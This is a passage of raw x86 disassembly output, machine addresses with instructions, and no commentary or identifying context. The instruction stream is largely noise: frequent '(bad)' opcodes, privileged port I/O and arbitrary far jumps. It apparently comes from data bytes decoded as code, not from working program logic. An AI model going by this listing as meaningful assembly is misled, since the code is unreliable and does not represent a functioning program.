  406a9a:	jl     0x406a9c
  406a9c:	leave  
  406a9d:	aam    0x31
  406a9f:	out    0x9e,eax
  406aa1:	mov    dl,0xc0
  406aa3:	mov    ecx,0x62fff7ef
  406aa8:	mov    ds:0x102ca350,al
  406aad:	mov    al,bh
  406aaf:	cdq    
  406ab0:	adc    eax,0x836f718b
  406ab5:	(bad)  
  406ab7:	call   0x81685adc
  406abc:	sbb    BYTE PTR [ebp+0xd],ah
  406abf:	call   0xca5b:0x99478c22
  406ac6:	(bad)  
  406ac8:	push   cs
  406ac9:	fsub   st(0),st
  406acb:	sub    al,0x55
  406acd:	dec    esp
  406ace:	mov    cl,0xa7
  406ad0:	inc    ebx
  406ad1:	mov    ah,0x61
  406ad3:	aad    0xd5
  406ad5:	test   DWORD PTR [esi],0x274e4140
  406adb:	jns    0x406b08
  406add:	mov    eax,DWORD PTR ds:0x3b97efa
  406ae3:	aad    0xe5
  406ae5:	sar    edi,0x81
  406ae8:	ret    0x2047
  406aeb:	xchg   BYTE PTR [ebp+ebx*2-0x55],cl
  406aef:	cli    
  406af0:	stos   BYTE PTR es:[edi],al
  406af1:	mov    ds:0x6d80d142,eax
  406af6:	push   0xffffffc4
  406af8:	int    0x4a
  406afa:	cmp    DWORD PTR [eax],eax
  406afc:	mov    ebx,esi
  406afe:	pop    edx
  406aff:	sub    BYTE PTR [ecx+0x2018b495],al
  406b05:	shr    edx,1
  406b07:	ret    0x89a6
  406b0a:	xor    dl,BYTE PTR [esi+0xf]
  406b0d:	and    BYTE PTR [esi],cl
  406b0f:	ficom  DWORD PTR [eax-0x56]
  406b12:	jle    0x406b68
  406b14:	in     al,0xd0
  406b16:	or     ah,bl
  406b18:	adc    ebp,DWORD PTR [edx+esi*2+0x1530c7ac]
  406b1f:	pop    ss
  406b20:	(bad)  
  406b21:	fs test eax,0x877ddc57
  406b27:	push   edx
  406b28:	sbb    eax,0xcee8be5c
  406b2d:	jo     0x406b77
  406b2f:	addr16 xchg ebx,eax
  406b31:	jle    0x406ace
  406b33:	add    dh,BYTE PTR ds:0x3ce8deed
  406b39:	push   edi
  406b3a:	sbb    al,0xfb
  406b3c:	mov    al,0x7c
  406b3e:	xchg   esp,eax
  406b3f:	cmp    eax,0x59bdab8b
  406b44:	cdq    
  406b45:	fisttp WORD PTR [ebp+0x75]
  406b48:	push   ecx
  406b49:	dec    ebx
  406b4a:	pop    ecx
  406b4b:	dec    edi
  406b4c:	mov    eax,ds:0x766626d0
  406b51:	ins    DWORD PTR es:[edi],dx
  406b52:	jge    0x406ad7
  406b54:	push   0x1855c6ee
  406b59:	add    dl,ch
  406b5b:	mov    bl,0x9f
  406b5d:	mov    eax,ds:0xbd04b98b
  406b62:	cmp    eax,0x17613a04
  406b67:	mov    eax,0xb074479f
  406b6c:	aad    0xa
  406b6e:	and    al,0xcb
  406b70:	neg    DWORD PTR [edi-0xa]
  406b73:	pop    ecx
  406b74:	clc    
  406b75:	add    eax,0xdb5b6198
  406b7a:	hlt    
  406b7b:	sahf   
  406b7c:	add    ch,dl
  406b7e:	sub    ah,BYTE PTR [ebp-0x6]
  406b81:	inc    ecx
  406b82:	inc    ebx
  406b83:	sub    ch,BYTE PTR [edx-0x5]
  406b86:	xor    al,0x6a
  406b88:	pop    ds
  406b89:	and    BYTE PTR [edi+0x2c],bh
  406b8c:	jnp    0x406b3c
  406b8e:	shl    DWORD PTR [ebx],0x9d
  406b91:	(bad)  
  406b92:	lods   al,BYTE PTR ds:[esi]
  406b93:	xor    eax,0x4c1d9b73
  406b98:	or     al,0xff
  406b9a:	lea    edx,[ebp+0x53ed0114]
  406ba0:	jmp    0x406bb2
  406ba2:	shl    cl,cl
  406ba4:	ss inc edi
  406ba6:	sub    cl,BYTE PTR cs:[ebx-0x18]
  406baa:	xchg   esp,eax
  406bab:	out    dx,al
  406bac:	outs   dx,DWORD PTR ds:[esi]
  406bad:	xor    edx,DWORD PTR [edi-0x2f]
  406bb0:	sbb    BYTE PTR [ebp-0x30c41870],ch
  406bb6:	punpckhdq mm4,mm6
  406bb9:	push   ss
  406bba:	stos   DWORD PTR es:[edi],eax
  406bbb:	push   0x17
  406bbd:	outs   dx,DWORD PTR ds:[esi]
  406bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bbf:	or     esi,0x11
  406bc2:	into   
  406bc3:	or     eax,0xa939be14
  406bc8:	mov    BYTE PTR [ecx-0x15bfd79f],ch
  406bce:	sbb    eax,0x36187281
  406bd3:	xchg   esp,eax
  406bd4:	dec    ecx
  406bd5:	fs stos DWORD PTR es:[edi],eax
  406bd7:	(bad)  
  406bd8:	loopne 0x406b6c
  406bda:	or     DWORD PTR [edx],0x10
  406bdd:	mov    ebp,0xb8649d4d
  406be2:	jbe    0x406c2b
  406be4:	aam    0xe4
  406be6:	ins    DWORD PTR es:[edi],dx
  406be7:	sub    esp,DWORD PTR [edx]
  406be9:	cmp    DWORD PTR [edi],ebp
  406beb:	enter  0x5308,0xc5
  406bef:	cli    
  406bf0:	loopne 0x406ba5
  406bf2:	jle    0x406c73
  406bf4:	xchg   ebp,eax
  406bf5:	jae    0x406bd0
  406bf7:	or     edx,ebp
  406bf9:	push   es
  406bfa:	and    BYTE PTR [ebp+ebp*4-0x27],0x7e
  406bff:	lock and ecx,DWORD PTR ss:[eax]
  406c03:	call   0xa4ce:0xfc84626b
  406c0a:	cmc    
  406c0b:	add    esp,DWORD PTR [esi]
  406c0d:	push   ecx
  406c0e:	loope  0x406bc0
  406c10:	pop    ds
  406c11:	arpl   WORD PTR [ebp+0x58],ax
  406c14:	mov    ecx,0x5e307f1f
  406c19:	test   bl,bh
  406c1b:	mov    es,WORD PTR [eax-0x53]
  406c1e:	outs   dx,BYTE PTR ds:[esi]
  406c1f:	fidivr WORD PTR [edi-0x20562acf]
  406c25:	bound  edi,QWORD PTR [esi-0x4d]
  406c28:	mov    edx,0x92de85a1
  406c2d:	mov    esp,0x6e462baf
  406c32:	or     eax,DWORD PTR [ebp+0x129f0d4b]
  406c38:	mov    DWORD PTR [ecx-0x40],edx
  406c3b:	je     0x406bd5
  406c3d:	je     0x406bbf
  406c3f:	sahf   
  406c40:	dec    eax
  406c41:	arpl   WORD PTR [edx-0x2d],cx
  406c44:	shl    BYTE PTR [ecx-0x24],1
  406c47:	daa    
  406c48:	push   esp
  406c49:	cli    
  406c4a:	loopne 0x406c5a
  406c4c:	sub    al,0xfe
  406c4e:	xchg   edi,eax
  406c4f:	xor    DWORD PTR [ebp+0x51],esp
  406c52:	ss out 0xf7,al
  406c55:	sbb    al,0x8c
  406c57:	inc    ecx
  406c58:	and    eax,0x27a73a81
  406c5d:	push   ecx
  406c5e:	sub    al,0x33
  406c60:	loope  0x406c14
  406c62:	popa   
  406c63:	xchg   ecx,eax
  406c64:	mov    dl,0xc9
  406c66:	ret    
  406c67:	pop    ss
  406c68:	daa    
  406c69:	jnp    0x406c91
  406c6b:	ins    DWORD PTR es:[edi],dx
  406c6c:	out    dx,al
  406c6d:	mov    esp,0x254f7509
  406c72:	jmp    0x615e:0x8395526d
  406c79:	xor    dh,BYTE PTR [eax]
  406c7b:	mov    esp,0x2c2aadd6
  406c80:	jle    0x406c46
  406c82:	outs   dx,DWORD PTR ds:[esi]
  406c83:	push   cs
  406c84:	xchg   ch,bl
  406c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c88:	mov    esp,0xeba692f6
  406c8d:	nop
  406c8e:	mov    eax,ds:0x46aa3419
  406c93:	ffree  st(6)
  406c95:	push   ss
  406c96:	cmp    esp,ecx
  406c98:	push   ss
  406c99:	push   ss
  406c9a:	shr    DWORD PTR [ebp+0x7e57de35],1
  406ca0:	repz sub dl,BYTE PTR [ebp-0x5]
  406ca4:	jecxz  0x406d05
  406ca6:	inc    ebp
  406ca7:	fmulp  st(6),st
  406ca9:	dec    edx
  406caa:	mov    eax,0x11ed0df3
  406caf:	inc    esi
  406cb0:	call   0xae78:0x9c44938d
  406cb7:	xor    DWORD PTR [edx+0x37336d53],edi
  406cbd:	shl    DWORD PTR [edi+ebx*4+0x1a],1
  406cc1:	scas   al,BYTE PTR es:[edi]
  406cc2:	bound  ecx,QWORD PTR [ebx]
  406cc4:	sbb    BYTE PTR [ecx+0x1e211851],ch
  406cca:	outs   dx,DWORD PTR ds:[esi]
  406ccb:	dec    ebp
  406ccc:	ja     0x406cc1
  406cce:	inc    ebp
  406ccf:	enter  0x24a1,0x5e
  406cd3:	mov    dl,0xd4
  406cd5:	cmp    edi,DWORD PTR es:[ecx+0x30]
  406cd9:	iret   
  406cda:	lods   eax,DWORD PTR ds:[esi]
  406cdb:	push   esp
  406cdc:	mov    eax,0xa9d65d54
  406ce1:	cmp    DWORD PTR [ebp+eiz*2-0x5d],0xffffffbb
  406ce6:	mov    eax,ds:0x84fd7df4
  406ceb:	outs   dx,DWORD PTR ds:[esi]
  406cec:	pop    ebx
  406ced:	cmp    edi,edx
  406cef:	mov    ds:0x75fb06a9,al
  406cf4:	cmp    eax,0x7fe00239
  406cf9:	inc    ecx
  406cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cfb:	xor    eax,0x18ac0151
  406d00:	cmp    BYTE PTR [edx-0x20],ch
  406d03:	js     0x406d34
  406d05:	sbb    BYTE PTR [ebp+0x1038a78c],bh
  406d0b:	out    dx,al
  406d0c:	outs   dx,DWORD PTR ds:[esi]
  406d0d:	add    eax,0xdd293961
  406d12:	push   ss
  406d13:	push   ds
  406d14:	cmp    eax,DWORD PTR [ecx]
  406d16:	xor    eax,0x90e62992
  406d1b:	sbb    bh,bl
  406d1d:	cmp    al,0xe4
  406d1f:	jb     0x406d5f
  406d21:	jp     0x406d2d
  406d23:	sbb    cl,BYTE PTR [edx+0x7]
  406d26:	jo     0x406d22
  406d28:	xchg   BYTE PTR [ebp-0x1c],bh
  406d2b:	fild   QWORD PTR [edx+0x70]
  406d2e:	cmp    ecx,DWORD PTR [ecx]
  406d30:	sar    DWORD PTR [eax+ecx*4-0x46],1
  406d34:	xchg   ebx,eax
  406d35:	mov    cl,0x51
  406d37:	stos   DWORD PTR es:[edi],eax
  406d38:	call   0xa4bca974
  406d3d:	inc    edx
  406d3e:	sub    BYTE PTR ds:0x7724b17f,0x3e
  406d45:	xor    eax,0x7409dc8e
  406d4a:	and    edi,esp
  406d4c:	mov    bl,0x3e
  406d4e:	lods   eax,DWORD PTR ds:[esi]
  406d4f:	push   eax
  406d50:	popf   
  406d51:	pop    es
  406d52:	fs aam 0x1a
  406d55:	ins    BYTE PTR es:[edi],dx
  406d56:	in     al,dx
  406d57:	jnp    0x406dcb
  406d59:	imul   eax,DWORD PTR es:[ebp+0x3e],0xffffff98
  406d5e:	cmp    BYTE PTR [ebp+0x36e0a5c],0x30
  406d65:	xor    esp,ecx
  406d67:	mov    al,ds:0xa7ee29cb
  406d6c:	inc    edx
  406d6d:	mov    al,ds:0x7df2038
  406d72:	retf   0x5f53
  406d75:	sbb    DWORD PTR [ecx+0x4f4334ad],0x2
  406d7c:	pop    edi
  406d7d:	jns    0x406dfa
  406d7f:	cmp    al,0x9e
  406d81:	and    ch,BYTE PTR [esi+edi*8-0x31aed2b5]
  406d88:	into   
  406d89:	dec    edi
  406d8a:	mov    ebp,0x7f0f3942
  406d8f:	jno    0x406d2c
  406d91:	test   eax,0xac29eef9
  406d96:	ret    0xe395
  406d99:	or     ebp,DWORD PTR [ebx+0x4f]
  406d9c:	call   0xdfea53c0
  406da1:	std    
  406da2:	add    al,0x77
  406da4:	xor    esi,edi
  406da6:	ficom  WORD PTR ds:0xd7968a2b
  406dac:	or     DWORD PTR [eax-0x5cc33f27],edi
  406db2:	les    ebp,FWORD PTR [edi+0x6b]
  406db5:	and    cl,al
  406db7:	sbb    eax,0xa3f9366c
  406dbc:	jmp    FWORD PTR [esi-0x4a0929ea]
  406dc2:	aas    
  406dc3:	aas    
  406dc4:	add    al,BYTE PTR [ecx+0x61]
  406dc7:	mov    edi,0x72c18650
  406dcc:	ds cmc 
  406dce:	add    esi,DWORD PTR [eax-0x26b8e59e]
  406dd4:	mov    bl,0xdf
  406dd6:	fcmovnb st,st(2)
  406dd8:	sub    al,0x52
  406dda:	sbb    ecx,DWORD PTR [esi]
  406ddc:	mov    edi,0xaf7f2d67
  406de1:	add    BYTE PTR [esi+eax*1+0x675ec693],ah
  406de8:	repz pop es
  406dea:	and    dl,ah
  406dec:	sub    eax,0x594a3424
  406df1:	pop    ds
  406df2:	mov    edx,0x29a21600
  406df7:	push   0xd1048275
  406dfc:	inc    esi
  406dfd:	sub    eax,DWORD PTR [edi+0x4255adf5]
  406e03:	cdq    
  406e04:	xchg   edi,eax
  406e05:	fnstsw WORD PTR [esi-0x19]
  406e08:	cwde   
  406e09:	loope  0x406e66
  406e0b:	mov    edx,0x66703b08
  406e10:	ds cmp bl,ah
  406e13:	jge    0x406e88
  406e15:	sub    eax,0xeea9ccbc
  406e1a:	fidiv  WORD PTR [ecx+0xe6b0509]
  406e20:	cli    
  406e21:	fwait
  406e22:	or     eax,0x836c696d
  406e27:	pop    edi
  406e28:	add    eax,0xac5d89f7
  406e2d:	outs   dx,BYTE PTR ds:[esi]
  406e2e:	cmp    DWORD PTR [ecx-0x55],eax
  406e31:	sub    eax,0x659d0ac6
  406e36:	pop    ebx
  406e37:	jle    0x406e0e
  406e39:	dec    edi
  406e3a:	retf   0xc1dd
  406e3d:	dec    edx
  406e3e:	fcmovnu st,st(2)
  406e40:	test   al,0x5e
  406e42:	push   0xffffff8b
  406e44:	add    DWORD PTR [ecx],ebp
  406e46:	sbb    eax,0x7139eb1b
  406e4b:	loope  0x406e7f
  406e4d:	test   al,0xc6
  406e4f:	int    0xfa
  406e51:	mov    eax,ds:0x39b2568a
  406e56:	inc    edi
  406e57:	mov    edx,0xce3d70d2
  406e5c:	mov    eax,0x6b9f34c2
  406e61:	and    ebp,DWORD PTR [eax+edi*8-0x54]
  406e65:	mov    al,0x9d
  406e67:	cmp    ch,BYTE PTR [ebx+0x1]
  406e6a:	adc    ebx,DWORD PTR [eax+0x51d54430]
  406e70:	push   0x21
  406e72:	push   esi
  406e73:	aaa    
  406e74:	inc    ebp
  406e75:	lahf   
  406e76:	fucomi st,st(0)
  406e78:	mov    ecx,0x81685185
  406e7d:	sahf   
  406e7e:	test   DWORD PTR cs:[esi-0x5c03cb6d],edi
  406e85:	push   ebx
  406e86:	rol    bh,cl
  406e88:	jecxz  0x406e26
  406e8a:	rol    ecx,0xdb
  406e8d:	adc    bh,BYTE PTR [eax-0x5f5c4634]
  406e93:	outs   dx,DWORD PTR ds:[esi]
  406e94:	ins    WORD PTR es:[edi],dx
  406e96:	and    eax,0x2fe4bfc6
  406e9b:	mov    ecx,0x6fa938c1
  406ea0:	jb     0x406e57
  406ea2:	add    dh,BYTE PTR [ebp+0x74]
  406ea5:	push   es
  406ea6:	out    dx,al
  406ea7:	mov    al,ds:0xce9fda3
  406eac:	and    al,0x4
  406eae:	jnp    0x406ea6
  406eb0:	adc    DWORD PTR [eax],ecx
  406eb2:	and    DWORD PTR [edi],ebx
  406eb4:	loopne 0x406ed0
  406eb6:	fistp  QWORD PTR [eax+ebx*4-0x38cd5e81]
  406ebd:	dec    eax
  406ebe:	pop    ebp
  406ebf:	inc    edx
  406ec0:	loopne 0x406f0e
  406ec2:	mov    ch,BYTE PTR [edi+0x1c]
  406ec5:	jmp    0x406eac
  406ec7:	cs jl  0x406f24
  406eca:	ins    BYTE PTR es:[edi],dx
  406ecb:	aas    
  406ecc:	jp     0x406eca
  406ece:	xor    edi,DWORD PTR [eax+0x2cde62e8]
  406ed4:	mov    ds:0x3a587ceb,al
  406ed9:	ss ins DWORD PTR es:[edi],dx
  406edb:	cmp    BYTE PTR [edi],0xbe
  406ede:	jge    0x406e73
  406ee0:	xlat   BYTE PTR ds:[ebx]
  406ee1:	fnstenv [edx]
  406ee3:	or     DWORD PTR [ebx],ecx
  406ee5:	mov    ebp,DWORD PTR [edi+0x1b]
  406ee8:	loop   0x406e7f
  406eea:	hlt    
  406eeb:	jbe    0x406eb8
  406eed:	imul   edx,DWORD PTR [esi],0x12d99ab4
  406ef3:	inc    esi
  406ef4:	and    DWORD PTR [esi-0xfdc8fbe],ecx
  406efa:	cmp    eax,0x307d5135
  406eff:	sub    edi,ecx
  406f01:	jbe    0x406f59
  406f03:	mov    bh,0xe6
  406f05:	push   0xe2b8d8a7
  406f0a:	(bad)  
  406f0b:	fsub   DWORD PTR [ebx]
  406f0d:	ret    
  406f0e:	sbb    BYTE PTR [ebp-0x3d77b763],cl
  406f14:	push   ss
  406f15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f16:	cmp    ch,BYTE PTR [ebx+ebp*4-0x69]
  406f1a:	test   DWORD PTR [ecx-0x1768586e],edx
  406f20:	and    eax,0xd291c797
  406f25:	icebp  
  406f26:	add    DWORD PTR [esi],edx
  406f28:	mov    bl,0xda
  406f2a:	in     eax,dx
  406f2b:	stos   BYTE PTR es:[edi],al
  406f2c:	and    edx,DWORD PTR [edi]
  406f2e:	cwde   
  406f2f:	iret   
  406f30:	inc    edi
  406f31:	xchg   esi,eax
  406f32:	cs pop es
  406f34:	test   DWORD PTR [eax],eax
  406f36:	scas   eax,DWORD PTR es:[edi]
  406f37:	add    DWORD PTR [ebx-0x23bd40f],ecx
  406f3d:	jno    0x406ef6
  406f3f:	and    al,BYTE PTR [ecx-0x5e]
  406f42:	call   esi
  406f44:	pop    ds
  406f45:	xlat   BYTE PTR ds:[ebx]
  406f46:	nop
  406f47:	in     al,0x83
  406f49:	pop    esp
  406f4a:	sbb    BYTE PTR [eax-0x5b],dh
  406f4d:	cmp    DWORD PTR [esi],eax
  406f4f:	retf   0xc408
  406f52:	dec    esp
  406f53:	out    dx,al
  406f54:	(bad)  
  406f56:	mov    dl,0x68
  406f58:	mov    bl,0x35
  406f5a:	pop    ebp
  406f5b:	mov    ch,0x58
  406f5d:	fsubp  st(6),st
  406f5f:	std    
  406f60:	or     bl,dh
  406f62:	arpl   WORD PTR [eax],sp
  406f64:	mov    edi,0xc22ef52b
  406f69:	scas   al,BYTE PTR es:[edi]
  406f6a:	xchg   esp,eax
  406f6b:	push   cs
  406f6c:	ja     0x406fd6
  406f6e:	cmp    ah,ch
  406f70:	push   eax
  406f71:	sub    eax,0xedf8c068
  406f76:	push   es
  406f77:	mov    gs,ecx
  406f79:	shl    DWORD PTR [ebp+0x1d82a801],1
  406f7f:	imul   esi,DWORD PTR [eax+0x23],0xf
  406f83:	mov    ebx,esi
  406f85:	xor    ebx,esi
  406f87:	out    dx,al
  406f88:	pop    esi
  406f89:	je     0x406fab
  406f8b:	mov    cl,cl
  406f8d:	jge    0x406ffb
  406f8f:	cli    
  406f90:	mov    edx,eax
  406f92:	and    eax,0x4ed9fc92
  406f97:	shl    DWORD PTR [eax+0x44],1
  406f9a:	not    DWORD PTR [esi+0x19]
  406f9d:	jns    0x406ffd
  406f9f:	hlt    
  406fa0:	loop   0x40701c
  406fa2:	jns    0x406f9d
  406fa4:	and    al,0x5
  406fa6:	or     DWORD PTR [edx-0x8],ecx
  406fa9:	imul   edi,DWORD PTR [esi+0x1a],0xa5d1603c
  406fb0:	adc    ecx,DWORD PTR [esp+eiz*2-0x11553133]
  406fb7:	mov    BYTE PTR [esi+0x21],ah
  406fba:	les    edx,FWORD PTR [ebx-0x30ee7ddb]
  406fc0:	(bad)  
  406fc1:	xor    eax,0xd24a0621
  406fc6:	(bad)  
  406fc8:	ret    0x99d5
  406fcb:	in     eax,dx
  406fcc:	adc    al,0x6b
  406fce:	mov    dh,0x4a
  406fd0:	test   eax,0xbbaeb3b5
  406fd5:	adc    eax,0xb881cf4d
  406fda:	mov    ds:0x92b51e81,eax
  406fdf:	dec    edx
  406fe0:	or     eax,0xd2684c84
  406fe5:	retf   0x62ff
  406fe8:	mov    eax,ds:0x8580c29b
  406fed:	shr    BYTE PTR [edi],cl
  406fef:	call   0x6cafd7f1
  406ff4:	mov    ds:0x101669d,eax
  406ff9:	hlt    
  406ffa:	leave  
  406ffb:	(bad)  
  406ffc:	pop    ebp
  406ffd:	sbb    eax,0x1a215087
  407002:	xor    bl,cl
  407004:	sbb    esp,DWORD PTR [ebp+edx*8-0x61]
  407008:	add    DWORD PTR [eax-0x69],eax
  40700b:	(bad)  
  40700c:	fldenv [esi+ebp*1]
  40700f:	inc    edx
  407010:	pop    ecx
  407011:	out    0x54,al
  407013:	pop    ecx
  407014:	fisubr DWORD PTR [ebx-0x7cf59ede]
  40701a:	mov    ebx,0x4478bb93
  40701f:	adc    BYTE PTR [eax+0x6b],al
  407022:	sbb    BYTE PTR [edx],ah
  407024:	mov    ah,0xbc
  407026:	push   ebx
  407027:	dec    edi
  407028:	aam    0xfb
  40702a:	xchg   ecx,eax
  40702b:	(bad)  
  40702c:	xchg   esi,eax
  40702d:	cmp    BYTE PTR [ebp+ecx*8-0x47],0xdd
  407032:	cmp    bl,bl
  407034:	ins    BYTE PTR es:[edi],dx
  407035:	mov    edx,0x69197761
  40703a:	fcmovnb st,st(7)
  40703c:	jno    0x407055
  40703e:	sbb    al,0x8b
  407040:	aas    
  407041:	ds jnp 0x406fd8
  407044:	dec    ecx
  407045:	loop   0x40707c
  407047:	cmp    eax,edx
  407049:	pop    eax
  40704a:	sbb    al,cl
  40704c:	pop    eax
  40704d:	leave  
  40704e:	mov    dh,0x6
  407050:	clc    
  407051:	sbb    edx,edi
  407053:	inc    BYTE PTR [edi]
  407055:	mov    dl,0x77
  407057:	addr16 repnz nop
  40705a:	lods   al,BYTE PTR ds:[esi]
  40705b:	mov    bx,dx
  40705e:	mov    ch,0xd1
  407060:	adc    BYTE PTR [edi],ch
  407062:	sbb    bh,0xcc
  407065:	fistp  WORD PTR es:[ebx+0x676c53dc]
  40706c:	xchg   ebp,eax
  40706d:	cmp    al,0x6e
  40706f:	cdq    
  407070:	sub    eax,0x8a5d4a9d
  407075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407076:	ds or  eax,0xfae4bf5
  40707c:	popf   
  40707d:	fisub  WORD PTR [ebp-0x47]
  407080:	inc    edx
  407081:	rol    BYTE PTR [ebp+0xe172bb6],cl
  407087:	cmp    esi,ecx
  407089:	aad    0xc6
  40708b:	jbe    0x407101
  40708d:	clc    
  40708e:	lea    eax,[edi+eax*1-0x2f]
  407092:	push   esp
  407093:	sub    DWORD PTR [edi],esi
  407095:	int    0x34
  407097:	sub    BYTE PTR [ecx],ch
  407099:	ins    DWORD PTR es:[edi],dx
  40709a:	repnz push ecx
  40709c:	out    0x4b,eax
  40709e:	pop    esp
  40709f:	jmp    0x30cd:0x2940afca
  4070a6:	ficom  WORD PTR [ebx]
  4070a8:	outs   dx,BYTE PTR ds:[esi]
  4070a9:	jb     0x4070b1
  4070ab:	sbb    al,0x56
  4070ad:	push   ss
  4070ae:	cmp    ah,BYTE PTR [ebx-0x36]
  4070b1:	out    dx,eax
  4070b2:	adc    DWORD PTR [edx+0x31],ecx
  4070b5:	daa    
  4070b6:	inc    edi
  4070b7:	bound  ebx,QWORD PTR [ecx]
  4070b9:	pop    eax
  4070ba:	imul   esp,DWORD PTR [esi],0x52
  4070bd:	mov    bl,ah
  4070bf:	mov    edx,ebp
  4070c1:	cmp    DWORD PTR [esi+0x1653caf2],0xffffffa9
  4070c8:	sbb    BYTE PTR [ebx+0x1],al
  4070cb:	aaa    
  4070cc:	call   0xdaf7:0xa33c1702
  4070d3:	rcr    ebx,0xb5
  4070d6:	mov    ds:0xa8c08601,eax
  4070db:	out    dx,al
  4070dc:	sub    BYTE PTR [edx+0xda5cbd6],bh
  4070e2:	lea    esp,[edi-0x5f]
  4070e5:	adc    al,0x50
  4070e7:	inc    edx
  4070e8:	jle    0x4070b1
  4070ea:	inc    edx
  4070eb:	inc    eax
  4070ec:	sub    BYTE PTR [esi+0x36a4389d],0xbe
  4070f3:	pop    ss
  4070f4:	mov    esp,0x566d0a1a
  4070f9:	shr    DWORD PTR [esi+0x51],cl
  4070fc:	jecxz  0x40713a
  4070fe:	dec    eax
  4070ff:	pop    eax
  407100:	mov    ss,WORD PTR [edi+0x3072185d]
  407106:	pop    esi
  407107:	shl    edx,cl
  407109:	das    
  40710a:	not    DWORD PTR [ebp+0xd43d6c3]
  407110:	cdq    
  407111:	aad    0xb9
  407113:	xchg   DWORD PTR [edx+0x753e2e10],ebx
  407119:	scas   eax,DWORD PTR es:[edi]
  40711a:	arpl   WORD PTR [esi+0x13],cx
  40711d:	mov    eax,0x5a7418f4
  407122:	test   DWORD PTR [esi+0x60],ebp
  407125:	adc    al,BYTE PTR [edi-0x1e]
  407128:	adc    esp,DWORD PTR [esi-0x37]
  40712b:	jne    0x4070e5
  40712d:	arpl   bp,ax
  40712f:	mov    ch,0x3c
  407131:	xor    DWORD PTR [ebx],ecx
  407133:	mov    ds:0xb736c3d0,eax
  407138:	ret    
  407139:	sub    eax,0x4f44e8e2
  40713e:	push   ebp
  40713f:	fisttp WORD PTR [ebp-0x5]
  407142:	jmp    0x40714a
  407144:	test   BYTE PTR [ecx-0x67],bh
  407147:	fs adc al,0x2a
  40714a:	daa    
  40714b:	xor    DWORD PTR [esp+edi*2],0xffffffce
  40714f:	sbb    BYTE PTR [edx+0x5d],bh
  407152:	gs dec edi
  407154:	sbb    al,0xd0
  407156:	pop    esi
  407157:	inc    ebp
  407158:	and    bl,BYTE PTR [ebp+0xfd5ceb4]
  40715e:	inc    esi
  40715f:	sbb    bl,BYTE PTR [ecx+eax*4+0xe]
  407163:	jbe    0x40710d
  407165:	jmp    0x371b:0xcf124aaf
  40716c:	push   ss
  40716d:	xchg   ebx,eax
  40716e:	aad    0xce
  407170:	xchg   esp,eax
  407171:	or     DWORD PTR [eax+0x179ef3cc],ecx
  407177:	and    esp,DWORD PTR [ebp-0x180ef05f]
  40717d:	sbb    bl,BYTE PTR [eax+0x27]
  407180:	icebp  
  407181:	enter  0xcb2e,0xca
  407185:	xor    BYTE PTR [ebp-0x50439c37],ah
  40718b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40718c:	mov    dh,BYTE PTR [ebx-0x73]
  40718f:	pop    ss
  407190:	jmp    0x149f:0xff76272f
  407197:	test   eax,0x88c7a891
  40719c:	fisubr WORD PTR [esi+0x6d]
  40719f:	mov    edx,0xc622ef89
  4071a4:	retf   0x31a6
  4071a7:	cmp    eax,0x53109cbb
  4071ac:	repnz push es
  4071ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071af:	dec    esi
  4071b0:	jge    0x40718b
  4071b2:	jg     0x407139
  4071b4:	inc    ecx
  4071b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b6:	mov    ebp,0xaf87f855
  4071bb:	ins    DWORD PTR es:[edi],dx
  4071bc:	(bad)  
  4071bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071be:	xor    ebx,ebp
  4071c0:	inc    esp
  4071c1:	ret    0x8d20
  4071c4:	cmc    
  4071c5:	lods   eax,DWORD PTR ds:[esi]
  4071c6:	sahf   
  4071c7:	push   cs
  4071c8:	xchg   ecx,eax
  4071c9:	jl     0x4071e3
  4071cb:	call   0x32d8e87e
  4071d0:	inc    edx
  4071d1:	add    DWORD PTR [edx-0x2182313b],0xffffff8c
  4071d8:	sub    eax,0xd1b51089
  4071dd:	dec    ebx
  4071de:	adc    DWORD PTR [edx+eiz*2+0x5d1a6f86],0xffffff86
  4071e6:	ror    DWORD PTR [ebx-0x615d7cfa],1
  4071ec:	repnz and eax,0xab678c39
  4071f2:	ss pusha 
  4071f4:	inc    ecx
  4071f5:	xor    BYTE PTR [edi-0x325ee0b2],0x4a
  4071fc:	es jo  0x40723a
  4071ff:	or     edx,DWORD PTR [eax-0x69]
  407202:	in     eax,0x95
  407204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407205:	mov    bl,0x95
  407207:	in     al,0x8
  407209:	pop    esi
  40720a:	fist   DWORD PTR [edx-0x4bf206ed]
  407210:	out    0x93,al
  407212:	jg     0x4071c8
  407214:	adc    al,0xfc
  407216:	pop    es
  407217:	daa    
  407218:	(bad)  
  407219:	iret   
  40721a:	dec    esp
  40721b:	adc    esp,ecx
  40721d:	or     BYTE PTR [ebx+0x3f],0x19
  407221:	fimul  DWORD PTR [edx]
  407223:	les    esp,FWORD PTR [ebp+0x49]
  407226:	mov    ebp,0x28c400df
  40722b:	mov    cl,0xa5
  40722d:	test   DWORD PTR [ecx+0x536483a4],esi
  407233:	in     al,0x9f
  407235:	sub    DWORD PTR [ecx],esp
  407237:	ja     0x40720b
  407239:	pop    ecx
  40723a:	and    BYTE PTR [ebx-0x2f2780ad],al
  407240:	xor    BYTE PTR [ecx-0x44],dl
  407243:	and    al,0xf8
  407245:	adc    ah,BYTE PTR [edx+0x4c34c966]
  40724b:	xchg   esi,eax
  40724c:	xchg   eax,ecx
  40724e:	cmp    BYTE PTR [eax-0x23],dl
  407251:	mov    dh,0xe4
  407253:	dec    ebp
  407254:	mov    al,ds:0xb920009
  407259:	fnstsw WORD PTR [eax-0x51]
  40725c:	loop   0x4072a5
  40725e:	cdq    
  40725f:	ret    0x994b
  407262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407263:	mov    DWORD PTR [esi-0x2142cc9e],eax
  407269:	loope  0x407220
  40726b:	or     eax,0xbb6dcaf4
  407270:	jo     0x407211
  407272:	jmp    0x407287
  407274:	mov    ebx,0xeda6fea6
  407279:	jmp    0xe5e9a9f4
  40727e:	push   cs
